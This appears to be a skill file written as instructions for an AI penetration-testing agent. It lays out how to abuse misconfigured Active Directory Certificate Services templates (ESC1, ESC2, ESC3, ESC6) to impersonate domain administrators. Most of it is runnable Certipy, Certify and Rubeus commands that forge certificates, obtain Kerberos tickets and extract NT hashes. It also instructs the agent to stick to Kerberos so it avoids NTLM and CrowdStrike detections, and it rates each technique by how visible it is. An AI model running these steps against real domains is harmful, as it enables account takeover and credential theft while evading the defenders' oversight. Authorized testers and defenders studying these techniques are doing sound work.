---
name: adcs-template-abuse
description: >
  Exploits misconfigured AD CS certificate templates to impersonate any domain
  user via SAN manipulation or enrollment agent abuse. Covers ESC1 (enrollee
  supplies subject), ESC2 (any-purpose/no EKU), ESC3 (enrollment agent), ESC6
  (EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag).
keywords:
  - ESC1
  - ESC2
  - ESC3
  - ESC6
  - certificate template
  - ADCS escalation
  - SAN abuse
  - enrollment agent
  - certipy req
  - Certify request
  - ENROLLEE_SUPPLIES_SUBJECT
  - any purpose EKU
  - certificate impersonation
tools:
  - Certipy
  - Certify.exe
  - Rubeus
  - certutil
opsec: medium
---

# ADCS Template Abuse (ESC1 / ESC2 / ESC3 / ESC6)

You are helping a penetration tester exploit misconfigured AD CS certificate
templates to impersonate arbitrary domain principals. All testing is under
explicit written authorization.

**Kerberos-first authentication**: Enumeration and certificate requests use
Kerberos auth when possible. Post-exploitation authenticates via PKINIT (pure
Kerberos) to avoid NTLM detection (Event 4776, CrowdStrike Identity Module).

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[adcs-template-abuse] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Domain user credentials (any privilege level — enrollment rights are key)
- Network access to a domain controller and CA server
- Tools: `certipy` (Python), optionally `Certify.exe` (C#), `Rubeus` (C#)

**Kerberos-first workflow**:

```bash
# Get TGT for Kerberos-based operations
cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP
# or with password
cd $TMPDIR && getTGT.py DOMAIN/user:'Password' -dc-ip DC_IP

export KRB5CCNAME=$TMPDIR/user.ccache

# All Certipy commands use -k -no-pass after this
certipy find -k -no-pass -dc-ip DC_IP -vulnerable -output engagement/evidence/certipy-adcs
```

**Tool output directory**: `certipy find` supports `-output` to control where
results are written — always use `-output engagement/evidence/certipy-<label>`.
Without it, certipy writes `{timestamp}_Certipy.{json,txt}` to CWD.

`getTGT.py`, `certipy req`, and `certipy auth` all write output files to CWD
with no output-path flag. Always prefix these commands with `cd $TMPDIR &&`.
`getTGT.py` does NOT support `-out` — CWD is the only control. When saving
evidence, use `mv` (not `cp`) to avoid stray duplicates:

```bash
mv $TMPDIR/administrator.pfx engagement/evidence/administrator.pfx
mv $TMPDIR/administrator.ccache engagement/evidence/administrator.ccache
```

## Clock Skew Interrupt

**Before any Kerberos operation**, check for clock skew. If you encounter
`KRB_AP_ERR_SKEW` at any point during this skill — **STOP IMMEDIATELY**.

Do NOT fall back to NTLM authentication. Kerberos-first is an OPSEC
requirement, not a preference. NTLM fallback generates Event 4776 and
CrowdStrike Identity Module PTH signatures — the exact detections
Kerberos-first exists to avoid.

**When clock skew is detected:**

1. Note the skew magnitude (from the error or `ntpdate -q DC_IP`)
2. **STOP. Return to the orchestrator** with this structured interrupt:

```

### Clock Skew Interrupt
- Error: KRB_AP_ERR_SKEW
- Skew: <magnitude in seconds/minutes>
- DC IP: <IP>
- Stage: <what step you were on when it hit>
- Attempted: <commands that failed>
```

The orchestrator will handle clock sync (requires sudo) and re-invoke
this skill with identical parameters. Do not retry, do not work around
it with NTLM, do not write your own sync script.

## Step 1: Enumerate Vulnerable Templates

Run ADCS enumeration to identify vulnerable templates. If the orchestrator or
`ad-discovery` already provided results, skip to the relevant ESC.

### Certipy (Linux — preferred)

```bash
# Full enumeration with vulnerability detection
certipy find -k -no-pass -dc-ip DC_IP -vulnerable -output engagement/evidence/certipy-adcs

# JSON output for structured analysis
certipy find -k -no-pass -dc-ip DC_IP -vulnerable -json -output engagement/evidence/certipy-adcs

# With password (if no TGT available)
certipy find -username user@DOMAIN -password 'Pass' -dc-ip DC_IP -vulnerable -output engagement/evidence/certipy-adcs
```

### Certify.exe (Windows)

```bash
# Find all vulnerable templates
Certify.exe find /vulnerable

# Filter by enrollee-supplies-subject (ESC1)
Certify.exe find /enrolleeSuppliesSubject

# Filter by client-auth EKU
Certify.exe find /clientauth

# Show all permissions on all templates
Certify.exe find /showAllPermissions
```

### NetExec (quick check)

```bash
nxc ldap DC_IP -k --use-kcache -M adcs
```

### What to look for

| ESC | Key Indicator |
|-----|--------------|
| ESC1 | `ENROLLEE_SUPPLIES_SUBJECT` flag + client-auth EKU + low-priv enrollment |
| ESC2 | `Any Purpose` EKU (2.5.29.37.0) or **no EKU** + low-priv enrollment |
| ESC3 | Template with `Certificate Request Agent` EKU (1.3.6.1.4.1.311.20.2.1) + second template allowing on-behalf-of |
| ESC6 | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled |

**Check ESC6 flag specifically**:

```bash
# On CA server (requires remote access)
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 in output
```

### Decision tree

```
Vulnerable template found?
├── ENROLLEE_SUPPLIES_SUBJECT + auth EKU → ESC1 (Step 2)
├── Any Purpose or No EKU → ESC2 (Step 3)
├── Certificate Request Agent EKU → ESC3 (Step 4)
├── EDITF_ATTRIBUTESUBJECTALTNAME2 on CA → ESC6 (Step 5)
└── Template ACL writable → Escalate (ESC4)
```

## Step 2: ESC1 — Enrollee Supplies Subject

**Conditions**: Template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set,
client-auth or smart card logon EKU, enrollment rights for low-priv user,
no manager approval, no authorized signatures required.

The attacker specifies an arbitrary SAN (Subject Alternative Name) in the
certificate request, impersonating any domain user.

### Request certificate with SAN

```bash
# Certipy — request as domain admin via UPN
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'VulnTemplate' -upn 'administrator@domain.local'

# Certipy — with password auth
certipy req -username user@domain.local -password 'Pass' -target-ip CA_IP \
  -ca 'DOMAIN-CA' -template 'VulnTemplate' -upn 'administrator@domain.local'

# Certify.exe — /altname for SAN
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /template:VulnTemplate \
  /altname:administrator@domain.local
```

**Post-May 2022 (KB5014754)**: Certificates now include a security extension
with the requester's SID. The SAN identity must match the requestor unless
ESC9/ESC10 conditions exist. To work on patched systems, include the target SID:

```bash
# Certify with SID pinning
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /template:VulnTemplate \
  /altname:administrator \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500

# Certipy doesn't natively support SID in ESC1 request — use ESC9/10 chain
# or use the certificate for LDAPS auth instead of PKINIT
```

### Authenticate with certificate

```bash
# Certipy — PKINIT auth (returns TGT + optional NT hash via UnPAC)
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# Rubeus — request TGT and inject
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx \
  /password:pfx-password /ptt

# Rubeus — extract NT hash via UnPAC-the-Hash
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx \
  /password:pfx-password /getcredentials

# If PKINIT fails (KDC_ERR_PADATA_TYPE_NOSUPP) — use LDAPS/Schannel
certipy auth -pfx administrator.pfx -dc-ip DC_IP -ldap-shell
```

## Step 3: ESC2 — Any Purpose or No EKU

**Conditions**: Template has `Any Purpose` EKU (OID 2.5.29.37.0) or **no EKU
at all**, enrollment rights for low-priv user, no manager approval.

- **Any Purpose**: Certificate valid for client auth, server auth, code signing,
  etc. Exploit identically to ESC1.
- **No EKU**: Acts as a subordinate CA — can sign new certificates with arbitrary
  EKUs. More powerful but subordinate CA won't work for domain auth unless listed
  in NTAuthCertificates (not default).

### Any Purpose EKU (common case)

```bash
# Same as ESC1 — request with SAN if ENROLLEE_SUPPLIES_SUBJECT also set
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'AnyPurposeTemplate' -upn 'administrator@domain.local'

certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### No EKU (subordinate CA)

```bash
# Request subordinate CA certificate
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'NoEKUTemplate'

# This certificate can sign other certificates but won't directly
# authenticate to the domain unless added to NTAuthCertificates.
# More useful for code signing, S/MIME, or chaining with other attacks.
```

Explain that Any Purpose is directly exploitable like ESC1, while No EKU
requires chaining. Recommend focusing on Any Purpose templates.

## Step 4: ESC3 — Enrollment Agent Abuse

**Conditions**: Two templates required:
1. Template with `Certificate Request Agent` EKU (1.3.6.1.4.1.311.20.2.1),
   enrollment rights for low-priv user
2. Template allowing on-behalf-of enrollment with domain-auth EKU (schema v1
   or v2+ with Application Policy Issuance Requirement for Request Agent)

The attacker first obtains an enrollment agent certificate, then uses it to
request certificates on behalf of any user.

### Step 4a: Obtain enrollment agent certificate

```bash
# Certipy
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'EnrollmentAgentTemplate'

# Certify.exe
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA \
  /template:Vuln-EnrollmentAgent
```

### Step 4b: Request on behalf of target user

```bash
# Certipy — enroll on behalf of administrator
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -template 'User' -on-behalf-of 'DOMAIN\administrator' \
  -pfx 'agent.pfx'

# Certify.exe
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /template:User \
  /onbehalfof:DOMAIN\administrator /enrollment:agent.pfx \
  /enrollcertpwd:pfx-password
```

### Step 4c: Authenticate as impersonated user

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP

Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx \
  /password:pfx-password /ptt
```

**Note**: CA enrollment agent restrictions (certsrc.msc → CA Properties →
Enrollment Agents tab) can limit who the agent can enroll as. Default is
"Do not restrict enrollment agents" — allows everyone.

## Step 5: ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**Conditions**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled. This
allows a SAN to be specified as a certificate **attribute** (not extension)
in any request, even for templates that don't have ENROLLEE_SUPPLIES_SUBJECT.

This means standard templates like `User` become exploitable.

### Exploit

```bash
# Certipy — request User template with arbitrary SAN
certipy req -k -no-pass -dc-ip DC_IP -ca 'DOMAIN-CA' \
  -target CA_HOST -template User -upn administrator@domain.local

# Certify.exe
Certify.exe request /ca:CA.DOMAIN.LOCAL\DOMAIN-CA /template:User \
  /altname:administrator@domain.local

# certreq.exe (Windows native — no tools needed)
certreq.exe -new request.inf -config "CA_HOST\CA_NAME" \
  -attrib "SAN:upn=administrator@domain.local"
```

### Authenticate

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### Post-May 2022 patch impact

After KB5014754, the certificate's security extension contains the
**requester's** SID, not the SAN identity's SID. ESC6 exploitation on patched
systems requires ESC9/ESC10 conditions (weak certificate mapping) to succeed.

**Check if patched**:
- If `certipy auth` returns `KDC_ERR_CERTIFICATE_MISMATCH`, the DC enforces
  strong certificate binding and ESC6 alone is insufficient.
- Chain with ESC9/ESC10 if those conditions exist — route to **adcs-persistence**.

## Step 6: Certificate Authentication Reference

All ESC variants produce a PFX/certificate. Use these methods to authenticate:

### PKINIT (preferred — pure Kerberos)

```bash
# Certipy (returns TGT ccache + optional NT hash)
certipy auth -pfx target.pfx -dc-ip DC_IP -username target -domain DOMAIN

# gettgtpkinit.py (PKINITtools)
gettgtpkinit.py -cert-pfx target.pfx -pfx-pass pfx-password \
  DOMAIN/target target.ccache

# Rubeus
Rubeus.exe asktgt /user:target /certificate:target.pfx \
  /password:pfx-password /ptt
```

### UnPAC the Hash (extract NT hash from PKINIT TGT)

```bash
# With Certipy (automatic if PKINIT succeeds)
certipy auth -pfx target.pfx -dc-ip DC_IP
# Output includes NT hash

# With getnthash.py (PKINITtools)
export KRB5CCNAME=target.ccache
getnthash.py -key 'AS-REP-encryption-key' DOMAIN/target

# With Rubeus
Rubeus.exe asktgt /user:target /certificate:target.pfx \
  /password:pfx-password /getcredentials
```

### LDAPS/Schannel (fallback when PKINIT fails)

```bash
# When DC returns KDC_ERR_PADATA_TYPE_NOSUPP
certipy auth -pfx target.pfx -dc-ip DC_IP -ldap-shell

# From LDAP shell: can add computer, set RBCD, modify attributes
# Chain: LDAPS → RBCD → S4U2Self → service ticket
```

### Certificate format conversion

```bash
# PEM to PFX
openssl pkcs12 -in cert.pem -keyex \
  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
  -export -out cert.pfx

# PFX to PEM
openssl pkcs12 -in cert.pfx -out cert.pem -nodes

# Remove password from PFX
certipy cert -export -pfx cert.pfx -password 'old-pass' -out unprotected.pfx
```

## Step 7: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### CERTSRV_E_TEMPLATE_DENIED
Template ACL denies enrollment for current user. Verify enrollment rights with
`certipy find` or `Certify.exe find /showAllPermissions`. Look for group-based
enrollment (add yourself to the group via ACL abuse if possible).

### KDC_ERR_PADATA_TYPE_NOSUPP
DC doesn't support PKINIT pre-authentication. Use LDAPS/Schannel fallback:
`certipy auth -pfx cert.pfx -ldap-shell`. From LDAP shell, set RBCD or modify
attributes for alternative escalation.

### KDC_ERR_CERTIFICATE_MISMATCH
Certificate SID doesn't match target identity. System is patched (KB5014754).
ESC1/ESC6 alone won't work — need ESC9/ESC10 conditions or use the certificate
owner's identity instead.

### KDC_ERR_CLIENT_NOT_TRUSTED
CA certificate not in NTAuthCertificates or cert chain not trusted. Verify CA
is enterprise CA (not standalone). Check `certutil -viewstore -enterprise
NTAuth`.

### Certificate request pending (not issued)
Template requires manager approval. Check if you have ManageCA/ManageCertificates
permissions to approve it yourself — route to **adcs-access-and-relay** (ESC7).

### KRB_AP_ERR_SKEW (Clock Skew)

See **Clock Skew Interrupt** section above. STOP and return to the orchestrator.
Do not retry, do not fall back to NTLM.

### OPSEC comparison

| ESC | OPSEC | Detection Surface |
|-----|-------|-------------------|
| ESC1 | Medium | Certificate enrollment event (4887), SAN in request visible in CA logs |
| ESC2 | Medium | Same as ESC1. No-EKU subordinate CA is louder (4899) |
| ESC3 | High | Two enrollment events — agent cert + on-behalf-of request |
| ESC6 | Medium | Standard template enrollment, but SAN attribute visible in CA logs |
